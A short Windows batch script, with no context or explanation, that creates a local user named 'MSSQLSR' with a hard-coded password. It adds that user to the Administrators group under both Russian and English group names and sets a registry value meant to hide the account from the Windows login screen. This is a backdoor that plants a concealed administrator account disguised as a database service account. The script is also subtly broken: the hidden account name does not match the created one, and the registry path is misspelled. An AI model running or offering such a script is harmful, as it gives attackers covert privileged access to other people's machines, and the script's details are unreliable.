echo off
chcp 1251
net user MSSQLSR Admin01234 /add
net localgroup Администраторы MSSQLSR /add
net localgroup Administrators MSSQLSR /add
REG ADD "HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList\MSSQLSRV" /v MSSQLSRV /t reg_dword /d 0000000
chcp 866